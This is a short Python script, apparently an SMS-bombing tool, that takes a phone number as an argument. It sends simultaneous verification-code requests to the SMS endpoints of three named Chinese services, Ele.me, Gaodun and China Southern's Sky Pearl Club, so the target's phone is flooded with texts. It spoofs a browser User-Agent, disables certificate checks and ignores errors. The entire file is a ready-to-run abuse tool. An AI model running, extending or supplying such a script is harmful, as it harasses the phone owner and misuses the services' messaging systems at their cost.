import requests
import sys
import json
import warnings

common_hdrs={
   "User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0",
   "Accept"    :"*/*",
   "Connection":"Keep-Alive"
};

interface=[
  {
    "name"  : "饿了么",
    "url"   : "https://restapi.ele.me/v4/mobile/verify_code/send",
    "url2"  : "https://h5.ele.me/login/",
    "method": "POST",
    "param" : { 
           "mobile"  : "__PHONE__",
           "captcha_code"    : "",
           "scene"  : "login",
           "type"   : "sms"
    },
    "headers": {
    },
    "byJSON":True
  },
  {
    "name"  : "高顿网校",
    "url"   : "http://v.gaodun.com/Member/sendmsg",
    "url2"  : "http://v.gaodun.com/Member/register/st/w",
    "method": "POST",
    "param" : { 
           "phone"  : "__PHONE__",
           "type"   : "1"
    },
    "headers": {
    },
    "byJSON":False
  },
  {
    "name"  : "南航明珠俱乐部",
    "url"   : "http://skypearl.csair.com/skypearl/cn/quickEnrollSendAuth.action",
    "url2"  : "http://skypearl.csair.com/skypearl/cn/toQuickEnroll.action",
    "method": "POST",
    "param" : { 
           "contactNum"    : "__PHONE__",
           "contactType"   : "PHONE",
           "countryCode"   : "86"
    },
    "headers": {
    },
    "byJSON":False
  }
]
def setPhone(param,phone):
  for key in param:
    if param[key]=="__PHONE__":
      param[key]=phone
  return param
  
def send(info,phone):
    print("[*]正在调用[%s]的短信接口..." %(info["name"]))
    #设置Headers
    hdrs=common_hdrs
    hdrs["Referer"]=info["url"]
    for key in info["headers"]:
      hdrs[key]=info["headers"][key]
    #print(hdrs)
    #post_data
    post_data=setPhone(info["param"],phone)
    if info["byJSON"]:
      post_data=json.dumps(post_data)
    #发送请求
    if info["method"]=="POST":
      sess=requests.Session()
      #sess.get(info["url2"],verify=False)
      try:
        resp=sess.post(info["url"],data=post_data,headers=hdrs,timeout=5,verify=False)
      except Exception as e:
        do_nothing=""
      print(resp.text)
    #print("%s finish" %(info["name"]))
import threading
def send_all(phone):
    warnings.filterwarnings('ignore')
    threads=[]
    for info in interface:
      threads.append(threading.Thread(target=send,args=(info,phone,)))
    for t in threads:
      t.start()
    for t in threads:
      t.join()

if len(sys.argv)<2:
  print("使用方法: python SendCaptcha.py 1390000111(手机号)")
else:
  send_all(sys.argv[1])